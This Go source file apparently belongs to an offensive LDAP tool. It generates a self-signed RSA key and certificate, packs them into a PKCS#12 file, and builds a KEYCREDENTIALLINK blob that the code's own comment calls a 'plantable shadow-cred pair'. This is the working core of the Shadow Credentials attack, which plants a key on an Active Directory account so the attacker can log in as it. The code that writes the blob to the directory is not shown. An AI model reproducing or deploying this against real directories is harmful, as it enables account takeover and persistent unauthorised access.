package ldapcli

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"fmt"
	"math/big"
	"os"
	"time"

	"software.sslmate.com/src/go-pkcs12"
)

// KeyCredential identifiers (MS-ADTS KEYCREDENTIALLINK_ENTRY).
const (
	keyCredKeyID        byte = 0x01
	keyCredKeyMaterial  byte = 0x03
	keyCredKeyUsage     byte = 0x04
	keyCredKeySource    byte = 0x05
	keyCredDeviceID     byte = 0x06
	keyCredLastLogon    byte = 0x08
	keyCredCreationTime byte = 0x09
	keyUsageNGC         byte = 0x01
	keySourceAD         byte = 0x00
	keyCredBlobVersion       = 0x00000200
)

// GeneratedKeyCredential is a plantable shadow-cred pair.
type GeneratedKeyCredential struct {
	Blob     []byte
	PFX      []byte
	DeviceID [16]byte
}

// GenerateKeyCredential builds a self-signed RSA key + KEYCREDENTIALLINK_BLOB.
func GenerateKeyCredential(cn string) (GeneratedKeyCredential, error) {
	var out GeneratedKeyCredential
	if cn == "" {
		cn = "ark"
	}
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return out, err
	}
	if _, err := rand.Read(out.DeviceID[:]); err != nil {
		return out, err
	}
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return out, err
	}
	now := time.Now().UTC()
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             now.Add(-24 * time.Hour),
		NotAfter:              now.Add(10 * 365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return out, err
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return out, err
	}
	pfx, err := pkcs12.Legacy.Encode(key, cert, nil, "")
	if err != nil {
		return out, err
	}
	out.PFX = pfx
	mat := rsaPublicBlob(&key.PublicKey)
	keyID := sha256.Sum256(mat)
	ft := unixToFiletime(now)
	var body []byte
	for _, e := range [][]byte{
		keyCredEntry(keyCredKeyMaterial, mat),
		keyCredEntry(keyCredKeyUsage, []byte{keyUsageNGC}),
		keyCredEntry(keyCredKeySource, []byte{keySourceAD}),
		keyCredEntry(keyCredDeviceID, out.DeviceID[:]),
		keyCredEntry(keyCredLastLogon, ft[:]),
		keyCredEntry(keyCredCreationTime, ft[:]),
		keyCredEntry(keyCredKeyID, keyID[:]),
	} {
		body = append(body, e...)
	}
	blob := make([]byte, 4+len(body))
	binary.LittleEndian.PutUint32(blob[0:4], keyCredBlobVersion)
	copy(blob[4:], body)
	out.Blob = blob
	return out, nil
}

// WriteKeyCredentialPFX writes a PKCS#12 file mode 0600.
func WriteKeyCredentialPFX(path string, pfx []byte) error {
	if path == "" {
		return fmt.Errorf("--out required")
	}
	return os.WriteFile(path, pfx, 0o600)
}

func keyCredEntry(id byte, val []byte) []byte {
	b := make([]byte, 3+len(val))
	binary.LittleEndian.PutUint16(b[0:2], uint16(len(val)))
	b[2] = id
	copy(b[3:], val)
	return b
}

func rsaPublicBlob(pub *rsa.PublicKey) []byte {
	mod := pub.N.Bytes()
	exp := big.NewInt(int64(pub.E)).Bytes()
	buf := make([]byte, 24+len(exp)+len(mod))
	copy(buf[0:4], []byte("RSA1"))
	binary.LittleEndian.PutUint32(buf[4:8], uint32(pub.N.BitLen()))
	binary.LittleEndian.PutUint32(buf[8:12], uint32(len(exp)))
	binary.LittleEndian.PutUint32(buf[12:16], uint32(len(mod)))
	copy(buf[24:], exp)
	copy(buf[24+len(exp):], mod)
	return buf
}

func unixToFiletime(t time.Time) (out [8]byte) {
	const epochDiff uint64 = 116444736000000000
	ft := uint64(t.UnixNano()/100) + epochDiff
	binary.LittleEndian.PutUint64(out[:], ft)
	return out
}
